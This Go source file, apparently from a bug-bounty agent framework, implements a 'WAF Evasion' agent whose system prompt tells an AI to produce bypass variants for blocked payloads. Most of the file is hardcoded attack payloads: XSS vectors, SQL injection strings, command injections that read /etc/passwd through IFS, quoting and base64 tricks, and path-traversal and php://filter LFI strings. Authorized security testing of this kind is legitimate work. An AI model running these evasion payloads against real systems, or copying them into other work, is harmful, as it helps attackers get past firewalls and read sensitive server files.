// Package wafevasion implements the WAF Evasion specialist agent.
// A dedicated mutation engine that generates WAF bypass variants for payloads
// that were blocked by the target's WAF (Web Application Firewall).
// Supports Cloudflare, AWS WAF, ModSecurity, Akamai, Imperva, and generic WAFs.
package wafevasion

import (
	"context"
	"fmt"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

type Agent struct{ systemPrompt string }

func New() *Agent { return &Agent{systemPrompt: defaultSystemPrompt} }

func (a *Agent) Name() string         { return "WAF Evasion Agent" }
func (a *Agent) ID() string           { return "wafevasion" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	blockedPayload, _ := item.Payload["blocked_payload"].(string)
	vulnType, _ := item.Payload["vuln_type"].(string)
	wafName, _ := item.Payload["waf"].(string)

	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL")
	}

	// Select evasion techniques based on WAF + vuln type
	mutations := generateMutations(blockedPayload, vulnType, wafName)

	var findings []*base.Finding
	for _, m := range mutations {
		findings = append(findings, &base.Finding{
			Type:       "WAF Bypass",
			URL:        targetURL,
			Payload:    m.payload,
			Severity:   "high",
			Confidence: 0.0,
			Evidence: map[string]interface{}{
				"original_payload": blockedPayload,
				"technique":        m.technique,
				"waf":              wafName,
				"vuln_type":        vulnType,
			},
			Method: item.Payload["method"].(string),
		})
	}
	return findings, nil
}

type mutation struct {
	payload   string
	technique string
}

func generateMutations(blocked, vulnType, waf string) []mutation {
	var mutations []mutation

	switch strings.ToLower(vulnType) {
	case "xss":
		mutations = append(mutations, xssMutations(blocked, waf)...)
	case "sqli":
		mutations = append(mutations, sqliMutations(blocked, waf)...)
	case "rce":
		mutations = append(mutations, rceMutations(blocked, waf)...)
	case "lfi":
		mutations = append(mutations, lfiMutations(blocked, waf)...)
	default:
		mutations = append(mutations, genericMutations(blocked, waf)...)
	}

	return mutations
}

func xssMutations(blocked, waf string) []mutation {
	return []mutation{
		// Case mixing
		{"<ScRiPt>alert(1)</sCrIpT>", "case_mixing"},
		{"<IMG SRC=x oNeRrOr=alert(1)>", "case_mixing_event"},
		// Tag alternatives
		{"<svg/onload=alert(1)>", "svg_event"},
		{"<math><mi//xlink:href=\"javascript:alert(1)\">", "mathml_xss"},
		{"<details open ontoggle=alert(1)>", "details_toggle"},
		{"<marquee onstart=alert(1)>", "marquee_event"},
		// Encoding
		{"<script>\\u0061lert(1)</script>", "unicode_escape"},
		{"<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", "html_entity_event"},
		{"%3Cscript%3Ealert(1)%3C/script%3E", "url_encoding"},
		{"%253Cscript%253Ealert(1)%253C/script%253E", "double_url_encoding"},
		// Spaceless
		{"<svg/onload=alert`1`>", "template_literal"},
		{"<img/src/onerror=alert(1)>", "slash_separator"},
		// Comment bypass
		{"<scr<!---->ipt>alert(1)</script>", "html_comment_split"},
		// JavaScript protocol
		{"javascript:alert(1)//", "js_protocol"},
		{"jaVasCript:alert(1)//", "js_protocol_case"},
		// WAF-specific
		{"<img src=x onerror=top['al'+'ert'](1)>", "string_concat_bypass"},
		{"<img src=x onerror=window['alert'](1)>", "bracket_notation"},
		{"<img src=x onerror=self['ale'+'rt'](1)>", "self_bracket_concat"},
	}
}

func sqliMutations(blocked, waf string) []mutation {
	return []mutation{
		// Comment injection
		{"1'/**/OR/**/1=1--", "comment_spaces"},
		{"1'/*!50000OR*/1=1--", "mysql_version_comment"},
		// Case mixing
		{"1' oR 1=1--", "case_mixing"},
		{"1' UnIoN SeLeCt 1,2,3--", "union_case_mix"},
		// Encoding
		{"1%27%20OR%201%3D1--", "url_encoding"},
		{"1%2527%2520OR%25201%253D1--", "double_encoding"},
		// Alternative syntax
		{"1' || 1=1--", "or_operator"},
		{"1' && 1=1--", "and_operator"},
		// Null bytes
		{"1'%00OR 1=1--", "null_byte"},
		// String concatenation
		{"1' OR 'a'='a'--", "string_compare"},
		{"1' OR CHAR(49)=CHAR(49)--", "char_function"},
		// Time-based alternatives
		{"1' OR IF(1=1,BENCHMARK(1000000,SHA1('a')),0)--", "benchmark_timing"},
		{"1'; WAITFOR DELAY '0:0:5'--", "mssql_waitfor"},
		// Stacked query
		{"1'; SELECT 1--", "stacked_query"},
		// HPP (HTTP Parameter Pollution)
		{"1&id=1' OR 1=1--", "hpp_bypass"},
	}
}

func rceMutations(blocked, waf string) []mutation {
	return []mutation{
		// Variable substitution (IFS = Internal Field Separator)
		{"cat${IFS}/etc/passwd", "ifs_substitution"},
		{"cat$IFS/etc/passwd", "ifs_short"},
		{"{cat,/etc/passwd}", "brace_expansion"},
		// Command splitting
		{"c'a't /etc/passwd", "quote_splitting"},
		{"c\"a\"t /etc/passwd", "double_quote_split"},
		{"c\\at /etc/passwd", "backslash_escape"},
		// Encoding
		{"$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)", "base64_decode"},
		{"$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')", "hex_printf"},
		// Wildcard bypass
		{"/e?c/p?ss??", "wildcard_path"},
		{"/e[t]c/p[a]ssw[d]", "bracket_glob"},
		// Alternative commands
		{"head /etc/passwd", "alternative_cmd"},
		{"tail -n 50 /etc/passwd", "alternative_cmd_tail"},
		{"nl /etc/passwd", "number_lines"},
		// Newline/tab injection
		{";id%0a", "newline_separator"},
		{"|id%09", "tab_separator"},
	}
}

func lfiMutations(blocked, waf string) []mutation {
	return []mutation{
		// Double encoding
		{"%252e%252e%252f%252e%252e%252fetc%252fpasswd", "double_encoding"},
		// Unicode
		{"..%c0%af..%c0%afetc%c0%afpasswd", "unicode_encoding"},
		{"..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd", "fullwidth_slash"},
		// Null byte
		{"../../etc/passwd%00", "null_byte"},
		{"../../etc/passwd%00.jpg", "null_byte_extension"},
		// Path normalization tricks
		{"....//....//etc/passwd", "double_dot_slash"},
		{"..;/..;/etc/passwd", "semicolon_traversal"},
		{"..\\..\\etc\\passwd", "backslash_traversal"},
		// Encoding tricks
		{"%2e%2e/%2e%2e/etc/passwd", "dot_encoding"},
		{"..%252f..%252fetc%252fpasswd", "double_encoded_slash"},
		// PHP specific
		{"php://filter/read=convert.base64-encode/resource=/etc/passwd", "php_filter_base64"},
		{"php://filter/convert.iconv.UTF-8.UTF-7/resource=/etc/passwd", "php_filter_iconv"},
	}
}

func genericMutations(blocked, waf string) []mutation {
	return []mutation{
		// URL encoding
		{fmt.Sprintf("%%%s", toHex(blocked)), "full_url_encode"},
		// Double encoding
		{doubleEncode(blocked), "double_encode"},
		// Case mixing
		{mixCase(blocked), "case_mixing"},
		// Unicode normalization
		{toUnicode(blocked), "unicode"},
	}
}

func toHex(s string) string {
	var b strings.Builder
	for _, c := range s {
		b.WriteString(fmt.Sprintf("%%%02x", c))
	}
	return b.String()
}

func doubleEncode(s string) string {
	var b strings.Builder
	for _, c := range s {
		b.WriteString(fmt.Sprintf("%%25%02x", c))
	}
	return b.String()
}

func mixCase(s string) string {
	var b strings.Builder
	for i, c := range s {
		if i%2 == 0 {
			b.WriteRune(c)
		} else {
			b.WriteString(strings.ToUpper(string(c)))
		}
	}
	return b.String()
}

func toUnicode(s string) string {
	var b strings.Builder
	for _, c := range s {
		if c > 127 {
			b.WriteString(fmt.Sprintf("\\u%04x", c))
		} else {
			b.WriteRune(c)
		}
	}
	return b.String()
}

const defaultSystemPrompt = `You are a WAF Evasion Specialist — an expert at bypassing web application firewalls:

Your job: Take a BLOCKED payload and generate bypass variants that evade the WAF.

Techniques by Vulnerability Type:

XSS Evasion:
- Case mixing: <ScRiPt>, <iMg>
- Tag alternatives: <svg>, <math>, <details>, <marquee>
- Encoding: Unicode escapes, HTML entities, URL encoding, double encoding
- Spaceless payloads: <svg/onload=>, slash separators
- JavaScript obfuscation: bracket notation, string concat, template literals
- Comment injection: <scr<!---->ipt>

SQLi Evasion:
- Inline comments: /**/OR/**/, /*!50000UNION*/
- Alternative operators: ||, &&, BETWEEN, LIKE
- Encoding: URL encode, double encode, CHAR() function
- HPP (HTTP Parameter Pollution)
- Stacked queries with different terminators

RCE Evasion:
- IFS substitution: ${IFS}, $IFS
- Quote splitting: c'a't, c"a"t
- Base64 piping: $(echo <b64>|base64 -d)
- Wildcard paths: /e?c/p?ss??
- Alternative commands: head, tail, nl, tac

LFI Evasion:
- Double encoding: %252e%252e
- Unicode: %c0%af, %ef%bc%8f
- Path tricks: ....//....//,  ..;/..;/
- Null bytes: %00

RULES:
1. Generate 10-15 bypass variants per blocked payload
2. Prioritize techniques known to bypass the specific WAF
3. Always include both encoding and structural bypasses`
